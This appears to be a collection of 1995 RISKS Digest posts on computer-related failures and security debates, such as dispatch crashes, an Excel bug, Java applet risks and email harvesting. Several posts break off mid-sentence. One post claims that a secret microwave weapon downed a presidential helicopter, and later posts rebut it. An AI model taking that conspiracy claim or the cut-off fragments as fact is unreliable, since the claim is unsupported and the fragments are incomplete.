minutes, straddling the time from before midnight till after midnight,
didn't generate an exception.
<P>
It appears that one of the difficulties with identifying and rectifying the
system faults has been their use in a game of political football between
government (who has cut costs by using Intergraph), Intergraph (who is about
to provide similar systems for fire and police), the Ambulance Union (who
prefers its own members to do the dispatching, rather than non-paramedic
civilians), and MAS management (caught between the other three). Its hard to
tell what is what!

A Tragic Crash of a Presidential Helicopter or a Marine Corps Cover Up?<BR>
By C.J. Coley
<P>
On May 19, 1993, an unusual crash occurred in southern Maryland. What made
this crash unusual was not the loss of a military helicopter and four
dedicated Marines but the fact that the helicopter was part of the
Presidential 'White Top' fleet and the crewmen may have perished in a most
unusual way.
<P>
The first person on the scene was Frank C. Owens, a civilian who saw the
wreckage while driving home from an archaeological dig. He immediately
rushed to the site to render aid to any survivors. "I couldn't believe what
I saw," said Owens. "Those men were burned and there was almost no bleeding
from their wounds."  Owens went on to describe the grizzly sight in the
mangled wreckage. "What got me was there was fuel everywhere but no evidence
of a fire. Their uniforms weren't even burned. But the men sure were." What
Owens saw in the woods that day ultimately launched him on his own
investigation to find out what really happened.
<P>
The official Marine Corps Judge Advocate General (JAG) investigation blamed
the crash on an improperly installed 'roll pin' by maintenance personnel at
HMX-1 in Quantico, Virginia, but Owens didn't believe this explanation.
"Experts I talked to said this particular part would have failed almost<BR>
immediately after installation yet the helicopter had flown over fifteen
hours since the repair. It even flew President Clinton from the White House
to the U.S.S. Theodore Roosevelt. Besides, I don't know how they could have
come to any realistic conclusions without all of the evidence," Owens said
as he pointed to a display case containing over a thousand pieces of the
wreckage collected at the crash site more than a week after the incident.
"They certainly didn't follow normal investigative procedures," he said.
<P>
Owens believes that there may be another explanation as to the cause of the
crash. Owens discovered that the Sikorsky UH-60 Black Hawk has a long
history of Electromagnetic Interference (EMI) problems. Apparently, a number
of these helicopters were lost in the 1980's after flying too close to
microwave or broadcast towers. The Army tried to deny there was a problem
for years but was ultimately forced to retrofit their helicopters to correct
the problem. Owens went on to say he believes an Army research facility just
four miles from the crash site has been working on a high power microwave
system as part of the former Star Wars program. He believes that this
microwave directed energy or 'beam' weapon may have been responsible for the
crash.  "It just fits," said Owens. "The crash fits the profile of the Army
EMI problem. Most of them were flying below 1000 feet when they passed a
tower and just nosed in. It's also the only way I can explain the burns
suffered by the crewmen without damage to their clothing."
<P>
Owens' conclusions have been met with considerable resistance by Marine
Corps officials at HMX-1. He was even questioned by Naval Investigative
Service (NIS) agents who came to his White Plains, Maryland home early one
Sunday morning. In addition, orders have been reportedly issued by the
Marine Corps forbidding any further contact with Mr. Owens. But Owens vows
to continue his investigation. "Those men had wives and children and I just
can't let it go until something is resolved," he said.
<P>
In reality, the real truth may never be known. Marine Corps officials
continue to deny Owens' allegations and the helicopter wreckage has now been
removed from the Marine Corps inventory.  In addition, many of the records,
including critical autopsy photographs have been destroyed even though there
is pending law suit by the families of the deceased crew members.

anyone could provide verification for it. The story goes thus:
<P>
Several years ago a Colorado State professor of Mech Engr named Gerry
Johnson goes to an IBM networking exposition.  At this expo IBM is
demonstrating some kind of new networking software to link PCs to the IBM
global network.  Dr. Johnson being the savvy controls engineer that he is
asks for a demonstration of an unusual kind.  He knows that the software
will work in normal parameters, so he asks for something only an idiot
would.  He has the demo guy try to transfer a 50MB file from a 370 a few
miles away.  The catch is the PC has only a 20MB drive.  Dr. J's argument is
that if the software is written properly it will error out and say what's
wrong.  So they start the transfer and *poof* down goes the PC and the 370.
The demo guy is apologetic and asks Dr. J. to come back tomorrow, and he'll
see if he can get them to fix the problem overnight.  The next day Johnson
comes back to find the display boarded up.  A note says that the booth is
closed due to technical problems.  Later that day Johnson finds out why.
Not only did the 370 and the local PC go down, IBM'S ENTIRE GLOBAL NETWORK
BIT THE DUST!  Every computer attached to it went off-line.  Months later,
it turns out that it wasn't the new networking software as they had expected,
but a bit of code in the 370 MVS operating system that had never been
executed in the entire 15yrs or so that it had been in existence up to that
date.
<P>
According to the story around campus, this is a fairly (in)famous incident
in IBM history.  I would like to know if anyone out there knows anything
about it.  How about IBM's viewpoint on it?  I'd really like to know how
much of this is fact.
<P>
And, if no one knows anything, I hope it was at least amusing to read :)

I was surprised to see TV news stories and front page articles giving
instructions on how to derail a train from which bolts to remove to how to
defeat the electronic system checks. In today's news, there is some
suspicion that the sabotage was inspired by a recent article giving the
details and, in effect the instructions, on how to derail a train. It was a
story, in a limited circulation railroad magazine, describing a 50 year old
crash that, apparently, was printed a week ago.
<P>
This is reminiscent of the controversy over Internet security alerts, though
this doesn't necessarily argue for keeping the details secret. In the case of
the train, however, I was surprised how public the instructions were made.

<P>
I have been told that, in the early vacuum-tube days of computing, it was
the responsibility of one of the lower-order acolytes to go round the vacuum
tubes on the system and `ping' each one.  A `pong' meant that the tube had
failed or was about to fail, and it was replaced before the machine was
started.  How can we perform such preventive maintenance nowadays - are
there any systems which inform us of when they might be about to go wrong,
other than by having multiple instances of the hardware and reporting
disagreements?  What is the equivalent of the `ping' test for small
components?
<P>
The RISK? - implicit in any system that will tell you that it's _going_
wrong only when it's _gone_ wrong, like all of those dinky bits of
plastic-covered silicon with legs!

BACKGROUND: Java is a language for writing procedural objects known as
"applets", intended to be distributed on the World-Wide Web as easily as<BR>
HTML is distributed today.  Netscape Communications Corp. has announced the
impending release of a beta version of Netscape 2.0 to include support for
Java.  For more information, see:
<P>
<A HREF="http://java.sun.com">http://java.sun.com</A><BR>
<A HREF="http://home.netscape.com/comprod/products/navigator/version_2.0">http://home.netscape.com/comprod/products/navigator/version_2.0</A>
<P>
RISKS: On its face, Java violates the security principle that one should
minimize the execution of untrusted software.  On a Java-enhanced web, every
click of the mouse in one's web browser could download and execute software
about which one knows little or nothing.  The designers of Java say that
they have paid a great deal of attention to Java's security environment, and
they are confident that Java is immune to viruses.  This claim may be true,
but it does not address the issue of trojan horses.  Even if Java applets
have access only to local resources which have been explicitly authorized by
the user, the risk of trojans remains.  It seems to me that it is impossible
to grant an untrusted program useful access to resources without granting it
the opportunity to *misuse* those resources.
<P>
Furthermore, since one of the resources to which Java may often require
access is the network itself, a trojan written in Java might carry out all
sorts of mischief without touching the local disk: consider a Java applet
which does something useful or entertaining while surreptitiously spamming
targeted mailing lists or newsgroups with, let's say, racist hate mail.  I'm
sure others can think of nastier examples.
<P>
None of these risks are new with Java, but widespread use of Java promises
to change the risky event of running untrusted software from something the
average Internet user does occasionally to something the average Internet
user does every time s/he visits a new web page.
<P>
META-RISKS: I have posted these concerns to a variety of forums in the past
weeks (including comp.security.misc and the hotjava-interest and
www-security mailing lists).  I have yet to see any satisfying discussion of
whether or not the impending widespread deployment of Java-capable web
browsers constitutes a serious risk, or whether responsible system
administrators should permit the installation of Netscape 2.0 on their
systems.
<P>
Part of the problem seems to be that most everyone who really knows much
about Java had a hand in developing or testing it and is committed to its
success.  Part of the problem also seems to be a sense of inevitability,
that Java and Java-capable Netscape are much too attractive for their
developers to consider not releasing them or for users to consider not using
them once they are available.  It may turn out to be the case that Java's
benefits outweigh its risks, but the Internet community appears to be
incapable of considering its risks and benefits in advance.  There's nothing
new about technological determinism, but Java seems to be a fairly clear
case in miniature.

The Marketry company of Bellevue, Washington is now selling E-mail addresses
of Internet users obtained from Newsgroup postings. From the company's press
release:
<P>
"These are E-mail address of individuals who are actively using
the Internet to obtain and transfer information.  They have
demonstrated a substantial interest in specific area of information
on the Internet.  They are regularly accessing information in their
interest areas from newsgroups, Internet chats and websites. . . .
The file is anticipated to grow at the rate of 250,000 E-Mail
addresses per month, all with Interest selections."
<P>
What are the interest areas currently available?  "Adult, Computer,
Sports, Science, Education, News, Investor, Games, Entertainment
Religion, Pets."  The release notes that "additional interests areas
will be added, please inquire." Activities of US and non-US Net users
will be included in the Marketry product.
<P>
*The Washington Post* reported that the president of Marketry, Norm Swent,<BR>
would not disclose who the actual owner of the list is. "That really is
confidential information," Swent said, "and we are obviously bound by
confidentiality agreements with the list owner."
<P>
WHAT YOU CAN DO:
<P>
(a) Sit back, let your newsgroup postings get swept up by the data
scavengers and watch the junk E-mail pile high on your system, or
<P>
(b) Send E-mail to Marketry and tell them to STOP SELLING PERSONAL
DATA GATHERED FROM THE NET.  Send E-mail to: <A HREF="mailto:listpeople@marketry.com">listpeople@marketry.com</A>
and tell your friends to send E-mail.  And tell your friends' friends.

Victim of gas blast sent 3230 pound bill (=A3230), by David Graves
<P>
BRITISH Gas apologised yesterday for sending a bill to a man who died in an
explosion at his home caused by a suspected gas leak.  The invoice,
addressed to "Mr J Clark - Deceased", was sent last month to John Clark, 36,
a father of two, who died when the explosion demolished a block of flats in
Ilkeston, Derbyshire, in July.  [...]  The bills, collected by Miss Hill
from a local Post Office sorting office, were also addressed to Mr Clark's
flat, which was destroyed in the explosion.  [...]  A British Gas spokesman
said a "billing error" had allowed the bills to "slip through the net.  "We
made arrangements to put a block on all accounts affected by the explosion
but, unfortunately, due to an administrative error, these invoices were
accidentally sent to Mr Clark. We have launched an investigation."

Enter       1.40737488355328   in an Excel cell.
<P>
Appears     0.64
<P>
This is reproducible in version 4.0 or 5.0, under Windows

Also reported in Excel version 7 under Win 95.
<P>
Now, more details on the problem.
<P>
It shows for at least the following 3 numbers, and their negative<BR>
1.40737488355328     2.81474976710656     5.62949953421312

2^47 / 10^14         2^48 / 10^14         2^49 / 10^14
<P>
In my configuration the bug does not show  VISUALLY  in a cell<BR>
containing  =1.40737488355328 or  = 2^47 / 10^14 .<BR>
Still, such a cell has something badly wrong: taking it's integer
part gives 0 instead of 1.  That is,   =INT(2^48/10^14)   gives 0.
<P>
It appears to be a bug, not a deliberate signature of the code as
suggested in RISKS DIGEST 17.38.
<P>
The fact that the numbers triggering the bug have a simple mathematical
form make them immensely more likely to appear in an Excel cell than
if it was for a few arbitrary values.  Still, the spread of the bug by
Internet is an even more decisive factor ;-)
<P>
Microsoft is rumored to acknowledge the problem and have/prepare a fix.
Still, I failed to find any info on this in the Microsoft Knowledge
Base on Excel, at   <A HREF="http://www.microsoft.com/kb/indexes/excel.htm">http://www.microsoft.com/kb/indexes/excel.htm</A>

" This was discovered by Stuart Worley of Hughes Aircraft Company, Tucson<BR>
AZ when he input the following formula in a large spreadsheet

Map companies also seem to put intentional errors on their maps to detect
copyright infringement.  One error on a Pittsburgh street map would have had
drivers going down steps on a hillside where a street ended at the top of a
set of municipal steps.  Since this was not corrected on the map for many
years, I suspect that it was intentional.  Usually, this type of error is
limited to insignificant streets and roads; insignificant, that is, if you
never have to travel on them.

Your suspicion that the spreadsheet error was intentional may well be not
unfounded.

I have my doubts about that. When the publishers of "Who's Who" put in a
handful of fake biographical entries, they want to catch anyone who presents
the contents of "Who's Who" as their own research in, say, a rival
dictionary or a mailing list.
<P>
But Microsoft's great problem is the selling of pirated copies of their
software packages. The pirates want to present their copy not as their own
work but as the original product, feature for feature. A copied mistake adds
to the air of authenticity.

San Francisco has been trying for the past three years to upgrade its 911
system, but computer outages and unanswered calls remain rampant.  For
example, on 12 Oct 1995 the dispatch system crashed for over 30 minutes in
the midst of a search for an armed suspect (who escaped).  The dispatch
system was installed two months ago as a temporary fix to the recurrent
problems, and it too has suffered unexplained breakdowns.  Screens freeze;
vital information vanishes; and roughly twice a week the system crashes.
Dispatchers are not able to answer between 100 and 200 calls a day.  Many
nonemergency calls are also being lost.  [Source: article by Phillip Matier
and Andrew Ross, *San Francisco Chronicle*, 18 Oct 1995, p.A1.]  The
reported extremely stressful working conditions seem similar to some of
the air-traffic controller woes.

A power failure at 12:08pm on 17 Oct 1995 caused a 12-minute outage in the
air-route traffic-control computer system, affecting traffic in parts of
Texas, Oklahoma, New Mexico, Louisiana, and Arkansas.  [News services.  No

An article in Flight International, 11-17 October 1995, p8, entitled
`DC-10 misses Frankfurt runway--by 300km', considers the aftermath.
<P>
Brussels ATC attributed the original error to the Shannon ATC controller
entering an incorrect code to the ATC flight-plan data. The Irish Aviation
Authority denies this, saying the correct code was passed to London ATCC,
the last such ATCC before Brussels. Brussels maintains that when the
aircraft got to them, the destination data had been changed. `A senior
Brussels ATC official' confirms that NW52 was cleared by London ATCC as it
left the London control region to descend to 24,000 ft (I think they mean
Flight Level 240 but I'm not sure -- I'll use FL's anyway). The aircraft's
planned track for Frankfurt would have taken it over Belgium at FL370 under
control of Maastricht ATCC in the Netherlands, which handles traffic over
FL245 across Belgium.
<P>
NW52 also addressed Brussels as `Frankfurt' on contact, and numerous times
thereafter. Brussels ATC didn't question the `addressing error', apparently.
They were also cleared to a VOR, Bruno, that they didn't recognise, and
asked for the frequency. They were cleared for an ILS RWY 25L approach,
which is the same runway orientation as at Frankfurt, but with a different
ILS frequency. NW says that the crew must share responsibility, no matter
what happened with ATC (this is in any case what aviation law requires).
<P>
It looks like there is a lot for them to discuss.

An article by Brian McGrory entitled "E-mail as evidence" in *The Boston
Globe*, 19 Oct 1995, p.1, (the article discusses this and also the issues
about companies' right to read employee E-mail) had the following anecdote,
which seems made for RISKS:
<P>
...A high-level executive with a Manhattan health company had a new
technology that allows users to tape themselves with a tiny camera
built into their monitor, send it through the system, and have it
appear on the recipient's screen as a talking, moving image [sounds
like a Connectix camera on a Macintosh to me].
One night, arriving at her hotel, she flipped open her portable
computer and began recording such a message.  Sitting before her
laptop in the privacy of her room, she teasingly disrobed, performed
what a corporate lawyer later would describe as a "shimmy," and
purred to the intended recipient, a fellow married colleague, "Hurry
to the hotel and here's what you get tonight."
Problem is, she struck the wrong button on her computer, and the
video flashed on the screens of more than 400 employees throughout
her health company -- subordinates, bosses and people who had never
met her before."
<P>
The article goes on to describe how bootlegged copies of the message was
distributed around the company, and appeared on floppy disks sold at
computer fairs.  [Health fairs, too, perhaps?  PGN]
<P>
And I thought Oliver North had set the record for embarrassing E-mail
screw-ups.

<P>
If we are going to "analyze" java security, let's keep in mind that there is
an important distinction between the language (java) and the machinery which
runs the java program.
<P>
Java is a general-purpose programming language along the lines of C/C++.
So, there is no doubt that its expressive power overwhelms our
theoretician's abilities to predict java-programs behavior -- this is where
we start getting into the halting problem, computability and other black
magic.  Basically, i don't think we can "trust" programs written in any
*useful* programming language.
<P>
The area where we can (must) build trust is the computing base.
Traditionally, this has been the OS, but in the case of java, it is the java
interpreter (such as netscape 2.0 and hotjava).  The browser is now the TCB
(trusted computer base) for all practical purposes...
<P>
And, to address the specific concern about applets spamming the net -- from
what I've seen, applets are only allowed to connect to the server that
supplied the applet in the first place (by default).  The worst thing one
could probably pull off is to spam oneself.

<P>
I think that before you go citing risks you out to read the Java
security documents and Java mail archives first.  They go into a lot of
detail discussing for the the "risks" that you mention and show that
they are not risks associated with running Java code.  [...]
<P>
The Java enabled browser can be configured so that applets loaded from
have access to the local machine or local network, applets loaded from
the local net can be allowed access to the local machine or local net,
applets loaded from non-local networks can denied access to the local
machine or network, so no this isn't a risk.
<P>
&gt; META-RISKS: I have posted these concerns to a variety of forums ...
<P>
Again, before you go blindly posting these messages, why don't you read
the mail archives first and save everyone from having to repeat the
discussion every month.  [...]
<P>
Please consider reading the Java papers and mail archives before suggesting
yet the same Java risk.

I think you had it correct when you called this folklore.  I have no
previous knowledge of this, but it sounds a lot like the stories about
poisonous snakes wrapped in imported carpets or burglary victims finding
their pet Doberman choking on severed fingers.  I believe there have been a
book or books published on these types of stories, that everybody has heard
of (second hand) but can never be traced to an origin.
<P>
Has anybody checked the records of CSU to see if their ever was an
instructor by the name of Gerry Johnson?
<P>
Think about it.  Being good computer people, can we think of any piece of
code capable of this?  What would it be doing in an IBM 370 MVS operating
system written (in the early to mid 1970s?) long before personal computers,
and networking as we know it today was not much more than a few isolated
experiments?  What is "IBM's entire global network"? (Did they invent the
Internet long before the U.S. military thought of experimenting?)  Just how
would one go about "boarding up" a display booth?  Most of them can hardly
stand up on their own, much less support a load of lumber.
<P>
The real risks are bad enough.  It doesn't take more than a little
thinking to avoid chasing stories about a guy with a big blue ox.

&gt;[I have heard some reports that this flaw is actually an intentional<BR>
&gt;feature intended to detect copyright ripoffs....  PGN]
<P>
Usually, these inserted flaws are (should be?) in the non-executable
portion of a program.  Often, a section of code that will never be executed
is inserted.  To be most effective, this code should, in fact, be
unexecutable--containing a zero divide, for example.
<P>
The practice stems from a court case, Frank Shepard Co. v. Zachary P.
Taylor Pub., Co., 193 F. 991 (2d Cir., 1912).  In the case, the publisher of
a legal research book (Shepard's citator) inserted lists of citations for
cases that did not exist.  When 138 of these showed up in a competitor's
publication, the court presumed that the second work had copied the first.
<P>
Thus, I have no doubt that Excel has "bugs" inserted in it to allow
Microsoft to more easily prove code copying.  I would be surprised,
however, if these bugs were inserted into effective code.

I have no idea whether the "mysterious figure" is really a copyright trap,
but you can't rule it out this easily. Have we all forgotten the days of
reverse engineering, and "borrowing" code from other programs? Admittedly,
doing this for the calculation engine of Excel seems a rather odd
pursuit, though.
<P>
Another variation comes to mind, though. Has Microsoft ever licensed out
source or executable code to other companies. If anyone used the code in a
"black box" form, this would be a very simple way to track the licensed<BR>
code, and verify it hadn't been distributed improperly.

Sometime this summer (of '95) I read some IBM literature on their new series
of disc drives.  The new drives had some very interesting features including
"ping"s to check drive health and prevent corruption of data.
<P>
The "TravelStar" (I believe that's the name) was their series of notebook
computer drives.  They had a shock sensor which would alert the drive's
onboard controller to delay writes when you drop your notebook.  I don't
remember the number but recall it being able to sustain a fairly large shock
without corrupting data.
<P>
The "UltraStar" was described as having audio, vibration, and current
sensors installed which were used to detect impending failure of drive
components.  This feature (in theory) could have come in handy when (at 3am)
one of our drives started squealing.
<P>
This sounds good in theory, but how does it report the problems?  The method
of reporting was never mentioned in the literature.  One common method is to
flash the drive light in some pattern to alert you.  Probably not used as
most drives don't have LEDs these days (just small footprint connectors
specially designed NOT to work with any of the LEDs you have on hand).
Besides, most computers have the drives installed internally and the LED on
the front of the box shows CONTROLLER activity.  If the box is in a data
center, it may never be looked at anyway.
<P>
The better solution would be to have some SCSI command or inquiry that would
return information about the drives health.  Now we run into the problem of
how do we read it.  Most OSs would not have the code to check that
information.  One could probably write a program which would inquire that
information from the drive, if one had a familiarity with SCSI programming.
<P>
I've also heard that 4mm DDS tape drives store statistics on read and write
errors.  Apparently they also have several error correcting modes ranging
from none amazing.  Yet again, it seems most backup software doesn't worry
about this.  I'd presume these features would be configurable and/or played
up in the literature, but I've not run across any mention of these features
in the backup software I've used (no doubt there is some out there though).
<P>
But it's the thought that counts...  I'm sure I'm not the only one who is
running an UPS (at home) without the monitoring connection to the computer
hooked up.
<P>
The RISK is that the thought isn't enough.  A coordinated effort is required
for the scheme to work.  If you don't get the "lower-order acolytes" to ping
your tubes, the pong means nothing.

This reminds me of a story I heard on BBC Radio a few years ago: at an

bolts were done up tight. What better way than to put a spanner on the bolt
and give it a tug ? After a few months of weekly inspections like this,
bolts started shearing off. It took quite an investigation to find the cause

During our session (The Internet and Beyond) at the National Information
Systems Security Conference (formerly known as the NCSC Security Conference)
in Baltimore last week, Marcus Ranum made a reference in his presentation to
`waving a dead chicken over it' as an analogy to, what I like to call,<BR>
Voodoo Technology.
<P>
While humorous in context, the content issue is one of risks which are not
always readily apparent. Without proper testing and verification, network
security products intentioned to provide some level of access control,
application proxy service, or other types of security may not be the panacea
that it was envisioned.
<P>
The comparison is that while product marketing may claim that it is
bulletproof, the engineering verification folks may have simply `waved a
dead chicken over it' and muttered a few incantations. Take the time to test
and verify.

<P>
Concerning the VH-60 (the presidential version of the common UH-60 Black
Hawk) that has suspected EMI issues.
<P>
In the late 80's, I was involved as a system safety engineer on the UH-60
program and the development of the VH-60 and EMI hardening was a major
design requirement.  I am familiar with the EMI cases and they have usually
involved a nose low attitude at impact with the stabilator in the full down
position.  What used to happen is that the crews would use certain very high
power radio towers (such as Voice of America towers) a way points for
navigational reasons and we would see some uncommanded inputs a particular
times associated with certain power levels and frequencies.  A trained
aircraft accident investigator can tell with reasonable certainty, the
attitude and stabilator position at impact.
<P>
Any radio beam that could cook or burn human flesh is well above the design

It seems like Mr. Coley's note in <A HREF="/Risks/17.39.html">RISKS-17.39</A> on the Marine Corps'
helicopter crash is more appropriate for alt.conspiracy. Is it really
believable that the US has a giant Star Wars death ray that can microwave
troops from 4 miles away and that it accidentally cooked a Presidential
helicopter?

I did check carefully to see if the post was made on April 1, but

Was this story supposed to illustrate the RISKS of EMI?  RISKS of
believing unlikely stories from the net is more like it.
<P>
Coley tells us about a mysterious helicopter crash and subsequent cover-up
without offering *any* citations that can be checked.  Only one source
is quoted by name:  the man who "uncovered" the conspiracy.
<P>
One passage in particular sent my hoax detector past redline:
<P>
&gt;       "Those men were burned and there was almost no bleeding<BR>

Let's see.  People were burned, but clothing was unharmed.  Sounds like

Craig,
<P>
What's your relationship to this story?  The reasons why I ask are these:
<P>
First: The President does not travel from the White House in Black Hawk
helicopters -- he uses a rather old Sikorsky version which has been in
service since the Vietnam War.
<P>
Second: What qualifications does your apparent source, Mr. Owens, have for
deciding that a report on the crash is false, since he is not aware of which
helicopter model is used by the President?
<P>
Third: There appears to be no relation to comp.risks .
<P>
So, what's your reasoning?

I have difficulty in seeing how two postings in <A HREF="/Risks/17.39.html">RISKS-17.39</A> are relevant to
COMP.risks (my emphasis).  They are
<P>
Presidential Black Hawk Crash (Craig J. Coley)<BR>
How to derail a train (Bob Frankston)
<P>
Both were moderately interesting, but seem to have nothing to do with risks
of using computer-based systems.  I suppose that one could infer that
computers were used to control or direct the supposed microwave transmitter
in the first story.  The jumper wire in the Amtrak derailment may have been
intended to mislead a computer-based signal system, but the poster seemed
more concerned with the publication of "how to" information than with
computer-related errors.
<P>
While both articles are worthy topics of discussion, if comp.risks is going
to stray off-topic into the general risks of living in the industrialized
world, it runs a risk itself of becoming unfocused and, eventually, unread.

[Besides, it was an OLD story.  But the relevance issue has come up
repeatedly.  This is a forum on risks to the public in computers and
RELATED SYSTEMS.  Risks of interference are rampant (see my book,
Computer-Related Risks, for example), and need to be protected against --
even though they are not specifically computer relevant.  The death of
a pacemaker patient due to interference is clear evidence of that.  PGN]

Let me guess. "=A3" is a MIME escape for a pound sign [...],
and the bill was really for 230 pounds.  Right?
<P>
Mind those character sets, folks!  This reminds me of the item in
comp.dcom.telecom / Telecom Digest a few months back where a statement
intending to say that you should "dial `0'" in a certain situation came out
as "dial 302".
<P>
The latest wrinkle in this is the appearance of mail transport software
that detects characters with the high bit set and automatically converts
the whole message to MIME format in the hope that this is the safest
thing to so -- which leads to things like "=A3" turning up in mail
between people who have no idea what it means.  Until now, a character
set mismatch might cause some characters to come out wrong, but at least
the number of characters didn't change.

The recent issue of RISKS had so many items that I wanted to comment on
that I just had to write in:
<P>
&gt; Subject: Basic Flaws in Internet Security
<P>
On average, there are about 5 bugs of similar severity found in the
Internet every month.  This one was nothing special - in fact, just a
special case of known IP spoofing problems throughout the Internet.
<P>
&gt; Subject: Pinging the vacuum tubes (Re: Univac episode, Williams, <A HREF="/Risks/17.38.html">RISKS-17.38</A>)
<P>
There is a field called Built-In Self-Test that concentrates on testing
components at startup, during operation, and at other times.  Every PC I
know of does a set of start-up tests.
<P>
&gt; Subject: Risks in Java
<P>
Risks in Java are being widely discussed on the Internet, and the vast
majority of people I interact with find a great deal of risk in it.
<P>
&gt; Subject: Effective use of the Internet
<P>
So-called spamming is getting more frequent on the Internet.  At this
point, several mailing list owners are working on anti-spamming software
to detect the most simplistic threats.  They look at headers in multiple
mailing lists and if they match, the messages are blocked until the list
manager checks them.
<P>
There have also been a recent series of attacks where people use the
newsgroup "cancel" command to remove other users' messages from mailing
list distributions.
<P>
More similar attacks seem certain in the near future.
<P>
&gt; Subject: Risk of visiting wrong place on the Web
<P>
Junk mail is a legitimate marketing technique.  Like it or not, it is
going to happen.  I have been accused of it myself.  The cure is to add
integrity to the Internet, something that few of the Internet designers
seem to understand these days.
<P>
&gt; Subject:  Analysis of Human Factors and Outages
<P>
There have been several similar studies in the past and several books
have been written on how to reduce these things.
<P>
&gt; Subject: Re: Microsoft Excel 1.40737488355328
<P>
I was creating a simple spreadsheet in Excel for my father-in-law a few
months ago and noticed that it failed to copy a cell properly.  The cell
didn't have 1.40737488355328 in it.  Eventually, I abandoned Excel and saved
the file in 123 format.  When I ran it under 123, it gave the right answers.
I haven't used Excel since, and don't plan to ever use it again.  If you
can't copy or add correctly, you're a pretty poor spreadsheet.

1995 Edupage has an item on the new flaw in the Windows 95 version of Excel

<P>
I saw their attack in one of the security newsgroups, and I was
unimpressed by it.  It doesn't report anything new.
<P>
People have known for years that NFS was vulnerable to spoofing attacks.
This is not news.  People have known for years that even the commonly-used
authenticated file-service protocols (e.g., Kerberized NFS, AFS)
authenticate only the connection without authenticating the file data being
sent over it.  This is not news.
<P>
The solutions to this problem are known and have been for a long time.  The
easy solution is to install security-related binaries on the local disk
instead of on a fileserver.  Of course, this blows the diskless workstation
model, but I think that was on its way out anyway :-).  The hard solution is
to fix the file-service protocols to integrity-protect and/or encrypt their
data (and to get people to use secure file-service protocols like Kerberized
NFS or AFS, instead of relying on tried-and-true insecure NFS).  Perhaps
some work in that direction will arise from the attack published by Brewer
et al, and that would be a good thing to come out of what they published,
but otherwise, I don't see much point to it.
<P>
(An aside: I suspect that one of the reasons why integrity-protection<BR>
and/or encryption weren't put into Kerberized NFS and AFS originally
was that such protection significantly increases the CPU load on the
servers and clients using it; however, CPU speeds have increased so
much in the past few years that perhaps now we can spare the cycles to
make our files secure.)

<P>
From the October 18, 1995 Vancouver Sun<BR>
"Man seeks to clear his name after police error"
<P>
A Tsawwassen whose photo was wrongly placed on a "Crimestoppers" episode
linking him to bank-machine fraud says he wants his name cleared and those
responsible to pay.  ...  Sonny Walker, 19, withdrew money from a Richmond
Savings Credit Union bank machine on Dec 25, 1994. On the same day, someone
used a stolen card at the same machine.  Because the clock in the video
camera filming bank customers indicated Walker withdrew his money at the
same time as the fraud occurred, the bank forwarded his photo to Richmond
RCMP.  But the video-camera clock was wrong. Rachael MacKenzie, manager of
public relations for Richmond Savings admitted Thursday. It was out by about
one hour.  ...  When the [Crimestoppers] episode first ran, Walker heard
about it from friends.  ...  Walker and his mother went to the police right
away. Even though he protested his innocence and insisted a mistake had been
made, Walker was interrogated for 45 minutes.  ...
<P>
The Crimestoppers episode ran throughout the summer. Walker continued to
protest his innocence to police, but said he got nowhere.  ...  Finally, in
September, Colleen [his mother] called the bank to complain.  MacKenzie said
the call was the first she heard of the Crimestoppers episode, and she
immediately had the bank check its records.  "Within 2 or 3 days, we knew
the timing was wrong," she said. "We made a mistake on the evidence. Thee is
no question we feel horrible about this."
<P>
MacKenzie immediately sent a letter to police notifying them of the error
and criticizing police behaviour.  "We are concerned that you passed this
photo on to Crimestoppers with no prior notice to us and that you idn't
attempt to re-contact us after your initial discussions with Sonny's
mother," MacKenzie said in her letter.  But two weeks later, Walker's sister
saw an hour-long Crimestoppers special in which her brother's face was
displayed as part of the fraud episode, with an addendum stating that the
suspect and his family deny the allegations.  ...
<P>
Crimestoppers' police liason officer Dave Baker refused to comment except
to say there was a "screw-up, but I don't know whose."  ...
<P>
Risks? The usual dose of human stupidity, and as BC Privacy's commissioner
put it: "Our assumption is that technology can't make mistakes, but once
again we are shown it does make mistakes."

Macintosh users are out there!
<P>
From the "Feedback" column in this week's "New Scientist":
<P>
FEEDBACK was present when the International Data Corporation held its annual
European Information Technology Forum in Paris recently. Top executives from
top computer companies Lotus, Oracle, Hewlett-Packard, IBM and Compaq all
gave speeches. So did Bill Gates of Microsoft, who was in France to launch
Windows 95.
<P>
Needless to say all the speakers relied on electronic "slides", stored in a
computer and projected by a video system. The picture quality was fine, but
several speakers had a lot of trouble controlling the computer. Perhaps they

Whatever the reason, their slides kept refusing to change, or changed
too soon. When Andreas Barth, senior vice-president of Compaq, took the
stand he announced that he was not going to risk the same embarrassment.
<P>
So he was using an Apple Mac to show his slides.
<P>
It took a moment or two to appreciate the full significance of Barth's
remark. The vice-president of a huge company that has built its success on
selling PCs that run Windows was admitting to a top industry seminar that he
dare not use a Windows PC for his presentation, and was using the rival Mac
system instead.
<P>
Compaq's Mac presentation progressed without a hitch. But Feedback was more
than a little disappointed to see that Bill Gates had already left the hall.
So there was no chance to see the look on his face.
<P>
One is left wondering how many of the other presenters secretly identify
with Barth and, in the privacy of their own homes, use Apple Macs instead of
PCs.

This was definitely not a legend at my school, UC Santa Cruz.  There are
eight "colleges" at UCSC, and each has a required course that all freshman
have to take, which supposedly makes up the "core" of the college
curriculum.  Thus, it was known as the "core course."  At the time (12 years
ago) about 50% of campus CPU cycles were used to run nroff for writing
papers (the other 50% were for playing rogue.)  Less imaginative freshman
would use "core" as the filename for their beloved papers, with occasional
unfortunate results.

THERE IS NO SECURITY ON THE INTERNET (see RFC 1281 if you do not believe
me). The Internet addresses one thing and one thing only: delivering the
mail (packets).  It is solidly on the A of Availability.
<P>
Consequently, there is no "flaw" in the Internet, rather there may be a flaw
in the design of a module which makes use of the Internet, or there may be
a flaw in people's expectation of the Internet, but not the net itself, it
does its job very well.
<P>
It is probably best to think of the Internet as "the world's biggest party
line" (if that does not translate well outside the US, I apologise but have
no idea what other terms are common).
<P>
Unless the user takes steps to ensure the security of a message/file/etc.,
to authenticate that something actually came from where it appears to have,
and that it does not contain anything you might not want to receive, then
he/she/it/other has no-one to blame than themselves and certainly not the
'net (have noticed a certain tendency of the lemmings to be wont to blame
*anyone* else, mob rule/mob IQ &amp; all that).
<P>
When I examine a virus my favourite tool is DEBUG, when reading a message
that came from "somewhere", I use Vern Buerg's LIST. Both have the endearing
quality of assuming nothing for me.
<P>
Misplaced trust is really is not a prerogative of digital usage but "to
really screw things up takes a computer."  I suspect that we are rapidly
reaching a point where we are going to have to reassess trust in objects for
which no one is accountable.
<P>
In 1969, when the first Internet connections were made, the government
relied on strong encryption not only for confidentiality but also for
accountability, strong encryption which was the responsibility of the sites.
